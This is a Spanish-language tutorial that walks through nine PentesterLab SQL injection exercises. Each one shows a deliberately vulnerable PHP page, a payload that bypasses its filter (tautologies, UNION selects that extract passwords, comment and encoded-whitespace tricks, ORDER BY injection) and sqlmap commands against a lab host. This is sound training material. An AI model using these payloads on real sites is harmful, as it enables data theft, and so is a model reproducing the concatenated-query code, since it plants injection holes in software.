# Ejercicios de SQL Injection

Les traigo un par de ejercicios encontrados en hackplayers.com (les dejo el link en el pie de pagina)

## Ejercicio 1

En el primer ejercicio al observar el código php del servidor veremos que no hay ningún tipo de validación de entrada sobre el parámetro **$_GET["*name*"]**:

```php
<?php

  require_once('../header.php');
  require_once('db.php');
  // PAY ATTENTION HERE ------------------
    $sql = "SELECT * FROM users where name='";
    $sql .= $_GET["name"]."'";    
    $result = mysql_query($sql);
  // ----------------------------------
    if ($result) {
        ?>
        <table class='table table-striped'>
      <tr><th>id</th><th>name</th><th>age</th></tr>
        <?php
        while ($row = mysql_fetch_assoc($result)) {
            echo "<tr>";
                echo "<td>".$row['id']."</td>";
                echo "<td>".$row['name']."</td>";
                echo "<td>".$row['age']."</td>";
            echo "</tr>";
        }    
        echo "</table>";
    }
  require_once '../footer.php';
?>
```
si inyectamos el siguiente payload:

```
http://pentesterlab/sqli/example1.php?name=root' or 1=1-- -
```
la variable **$sql** será **SELECT * FROM users where name='' or 1=1-- -'** y el servidor nos devolverá todos los registros de la tabla de usuarios:

![tabla example](https://1.bp.blogspot.com/-ajJyb2yKiZU/WJUANoghjGI/AAAAAAAA4fI/4t0JJv4twM8-K72GbMczVyRjHMpWIZv1wCLcB/s1600/webforpentester_sqli_ejercicio1.png)

## Ejercicio 2

En el siguiente paso veremos que se filtra el carácter de espacio en los datos de entrada:

SERVIDOR:
```php
<?php
  require_once('../header.php');
  require_once('db.php');
// PAY ATTENTION HERE --------------
    if (preg_match('/ /', $_GET["name"])) {
        die("ERROR NO SPACE");    
    }
    $sql = "SELECT * FROM users where name='";
    $sql .= $_GET["name"]."'";

    $result = mysql_query($sql);
// ---------------------------------    
    if ($result) {
        ?>
        <table class='table table-striped'>
      <tr><th>id</th><th>name</th><th>age</th></tr>
        <?php
        while ($row = mysql_fetch_assoc($result)) {
            echo "<tr>";
                echo "<td>".$row['id']."</td>";
                echo "<td>".$row['name']."</td>";
                echo "<td>".$row['age']."</td>";
            echo "</tr>";
        }    
        echo "</table>";
    }
  require '../footer.php';
?>
```

Para evadir este sencillo filtro podemos utilizar los caracteres **/\*\*/** (comentario) o **%09** (tabulador codificado URL):

PAYLOAD:
```
http://pentesterlab/sqli/example2.php?name=root'%09and%09'1'='1
http://pentesterlab/sqli/example2.php?name=root'/**/union/**/select/**/1,(select/**/name/**/from/**/users/**/limit/**/3,1),(select/**/passwd/**/from/**/users/**/limit/**/3,1),4,5/**/and/**/'1'='2
```

También, podríamos intentar detectar la inyección de forma automatizada, normalmente con la herramienta de facto SQLMap con los siguientes parámetros y el tamper (modificador) correspondiente:

SQLMap
```
sqlmap -u &quot;http://pentesterlab/sqli/example2.php?name=root&quot; --dbs --tamper=space2comment
```

![sqlmap1](https://1.bp.blogspot.com/-FJfEvAVcrQU/WJUiz9HcKMI/AAAAAAAA4fY/leZobz5YuZMEZWmw5k5u81ekXp38Jxu_gCLcB/s1600/webforpentester_sqli_ejercicio2.png)

Si bien tener en cuenta que lo mejor es hacerlo de forma manual para saber exactamente qué se está haciendo. Además en el examen del OSCP no se pueden utilizar este tipo de herramientas automatizadas.


##  Ejercicio 3

 A continuación se utiliza la expresión regular **\s+** para filtrar uno o más espacios seguidos:

 Servidor:
```php
<?php
    require_once('../header.php');
  require_once('db.php');
  //PAY ATTENTION HERE ------------------------
    if (preg_match('/\s+/', $_GET["name"])) {
        die("ERROR NO SPACE");    
    }
    $sql = "SELECT * FROM users where name='";
    $sql .= $_GET["name"]."'";

    $result = mysql_query($sql);
  //--------------------------------------------
    if ($result) {
        ?>
        <table class='table table-striped'>
      <tr><th>id</th><th>name</th><th>age</th></tr>
        <?php
        while ($row = mysql_fetch_assoc($result)) {
            echo "<tr>";
                echo "<td>".$row['id']."</td>";
                echo "<td>".$row['name']."</td>";
                echo "<td>".$row['age']."</td>";
            echo "</tr>";
        }    
        echo "</table>";
    }
    require '../footer.php';
?>
```
Por lo que vamos a poder usar los caracteres **/\*\*/** (comentario) de antes para volver a inyectar:

PAYLOAD:
```
http://pentesterlab/sqli/example3.php?name=root'/**/union/**/select/**/1,(select/**/name/**/from/**/users/**/limit/**/3,1),(select/**/passwd/**/from/**/users/**/limit/**/3,1),4,5/**/and/**/'1'='2
```

## Ejercicio 4

A partir de ahora ya empiezan a trabajárselo un poquito más y, aunque obsoleta desde MySQL 5.5.0, utilizan la función "mysql_real_escape_string" para prevenir las inyecciones de los siguientes caracteres: \x00, \n, \r, \ , ', " y \x1a.+

Servidor
```php
<?php
  require_once('../header.php');
  require_once('db.php');
  //PAY ATTENTION HERE -------------------------------
  $sql="SELECT * FROM users where id=";
    $sql.=mysql_real_escape_string($_GET["id"])." ";
    $result = mysql_query($sql);
// -------------------------------------------------

    if ($result) {
        ?>
        <table class='table table-striped'>
      <tr><th>id</th><th>name</th><th>age</th></tr>

        <?php
        while ($row = mysql_fetch_assoc($result)) {
            echo "<tr>";
                echo "<td>".$row['id']."</td>";
                echo "<td>".$row['name']."</td>";
                echo "<td>".$row['age']."</td>";
            echo "</tr>";
        }    
        echo "</table>";
    }
    require '../footer.php';
?>
```

Sin embargo fallan en que utilizan el parámetro id como un número entero sin entrecomillarse ('), por lo que todavía sigue siendo vulnerable:

PAYLOAD
```
http://pentesterlab/sqli/example4.php?id=2 or 1=1
```


Evidentemente, en este caso también lo sacaríais con sqlmap sin problemas:

SQLMAP:
```
sqlmap -u &quot;http://pentesterlab/sqli/example4.php?id=2&quot; --dbs
```

![sqlmap2](https://4.bp.blogspot.com/-EqZBN4ZACpo/WJUoPniT94I/AAAAAAAA4fs/A5YdkLBFbXYgXpmJqmhHqiuvVsH7zDndgCEw/s1600/webforpentester_sqli_ejercicio4.png)

## Ejercicio 5

En el siguiente ejercicio se utiliza una expresión regular para asegurarse de que el parámetro id introducido es un entero. Lamentablemente el filtro es baldío porque si os fijáis sólo verifica que el INICIO del parámetro id es un entero:

Servidor
```php
<?php

  require_once('../header.php');
  require_once('db.php');
    if (!preg_match('/^[0-9]+/', $_GET["id"])) {
        die("ERROR INTEGER REQUIRED");    
    }
    $sql = "SELECT * FROM users where id=";
    $sql .= $_GET["id"] ;

    $result = mysql_query($sql);

    if ($result) {
        ?>
        <table class='table table-striped'>
      <tr><th>id</th><th>name</th><th>age</th></tr>
        <?php
        while ($row = mysql_fetch_assoc($result)) {
            echo "<tr>";
                echo "<td>".$row['id']."</td>";
                echo "<td>".$row['name']."</td>";
                echo "<td>".$row['age']."</td>";
            echo "</tr>";
        }    
        echo "</table>";
    }
    require '../footer.php';
?>
```

Así que conseguimos el objetivo simplemente poniendo un número entero en el principio del payload.

PAYLOAD
```
http://pentesterlab/sqli/example5.php?id=2 or 1=1
```

## Ejercicio 6

De nuevo existe un error al utilizar el regex. Esta vez el desarrollador ha intentado forzar que el parámetro id TERMINE en entero ($), pero vuelve a cometer un error y esta vez no asegura que el principio sea válido (^):

Servidor
```php
<?php

   require_once('../header.php');
  require_once('db.php');
  //PAY ATTENTION HERE -----------------------------
    if (!preg_match('/[0-9]+$/', $_GET["id"])) {
        die("ERROR INTEGER REQUIRED");    
    }
    $sql = "SELECT * FROM users where id=";
    $sql .= $_GET["id"] ;
//--------------------------------------------------------  

    $result = mysql_query($sql);


if ($result) {
        ?>
        <table class='table table-striped'>
      <tr><th>id</th><th>name</th><th>age</th></tr>
        <?php
        while ($row = mysql_fetch_assoc($result)) {
            echo "<tr>";
                echo "<td>".$row['id']."</td>";
                echo "<td>".$row['name']."</td>";
                echo "<td>".$row['age']."</td>";
            echo "</tr>";
        }    
        echo "</table>";
    }
    require '../footer.php';
?>
```

Así que nos vale la inyección anterior:

PAYLOAD:
```
http://pentesterlab/sqli/example6.php?id=2 or 1=1
```

## Ejercicio 7


Esta vez se comprueba tanto el inicio (^) como el final ($) del parámetro, pero la expresión regular contiene un modificador que permite múltiples líneas (/m).

Servidor:
```php
<?php

  require_once('../header.php');
  require_once('db.php');
    if (!preg_match('/^-?[0-9]+$/m', $_GET["id"])) {
        die("ERROR INTEGER REQUIRED");    
    }
    $sql = "SELECT * FROM users where id=";
    $sql .= $_GET["id"];

    $result = mysql_query($sql);

    if ($result) {
        ?>
        <table class='table table-striped'>
      <tr><th>id</th><th>name</th><th>age</th></tr>
        <?php
        while ($row = mysql_fetch_assoc($result)) {
            echo "<tr>";
                echo "<td>".$row['id']."</td>";
                echo "<td>".$row['name']."</td>";
                echo "<td>".$row['age']."</td>";
            echo "</tr>";
        }    
        echo "</table>";
    }
    require '../footer.php';
?>
```

Gracias a ésto podemos poner el entero en una línea para que el filtro lo de por válido... y en la siguiente línea (\n encodeado a %0a) añadir la inyección:

PAYLOAD:
```
http://pentesterlab/sqli/example7.php?id=2%0a or 1=1
```

## Ejercicio 8

En el ejercicio 8 tenemos que inyectar en una sentencia con 'order by'. Esto representa una dificultad añadida porque no podremos usar comillas simples o dobles ya que si las pusiéramos cogería el valor literal (order by 'id' ordenará literalmente por el nombre 'id' no por valor de la variable 'id').

Servidor
```php
<?php

  require_once('../header.php');
  require_once('db.php');
  //PAY ATTENTION HERE --------------------------------
    $sql = "SELECT * FROM users ORDER BY `";
    $sql .= mysql_real_escape_string($_GET["order"])."`";
    $result = mysql_query($sql);
  // ---------------------------------------------  
    if ($result) {
        ?>
        <table  class='table table-striped'>
        <tr>
            <th><a href="example8.php?order=id">id</th>
            <th><a href="example8.php?order=name">name</th>
            <th><a href="example8.php?order=age">age</th>
        </tr>
        <?php
        while ($row = mysql_fetch_assoc($result)) {
            echo "<tr>";
                echo "<td>".$row['id']."</td>";
                echo "<td>".$row['name']."</td>";
                echo "<td>".$row['age']."</td>";
            echo "</tr>";
        }    
        echo "</table>";
    }
    require '../footer.php';
?>
```

Entonces para que la sentencia tome como variable 'name' tenemos dos opciones:
- ponerla directamente ORDER BY name
- ponerla entre tildes ORDER BY \`name\`

Por lo que podemos construir el payload de la siguiente manera (%23 es  la almohadilla # encodeada):

PAYLOAD
```
http://pentesterlab/sqli/example8.php?order=name`%20%23%20or%20order=name`,`name`
```
## Ejercicio 9

 El último ejercicio de SQLi es similar al anterior, pero ya no se usan tildes (\`) para la variable:

 Servidor
 ```php
 <?php
  require_once('../header.php');
  require_once('db.php');
  //PAY ATTENTION HERE ---------------------------
    $sql = "SELECT * FROM users ORDER BY ";
  $sql .= mysql_real_escape_string($_GET["order"]);
    $result = mysql_query($sql);
  // --------------------------------------------------
    if ($result) {
        ?>
        <table class='table table-striped'>
        <tr>
            <th><a href="example9.php?order=id">id</th>
            <th><a href="example9.php?order=name">name</th>
            <th><a href="example9.php?order=age">age</th>
        </tr>
        <?php
        while ($row = mysql_fetch_assoc($result)) {
            echo "<tr>";
                echo "<td>".$row['id']."</td>";
                echo "<td>".$row['name']."</td>";
                echo "<td>".$row['age']."</td>";
            echo "</tr>";
        }    
        echo "</table>";
    }
  require '../footer.php';
?>
 ```

 En estos casos podemo anidar sentencias IF para generar nuestro payload válido:

 PAYLOAD
 ```
 http://pentesterlab/sqli/example9.php?order=IF(1,name,age)
 ```

[Fuente Original](http://www.hackplayers.com/2017/02/pentesterlab-web-for-pentester-1-sqli.html)
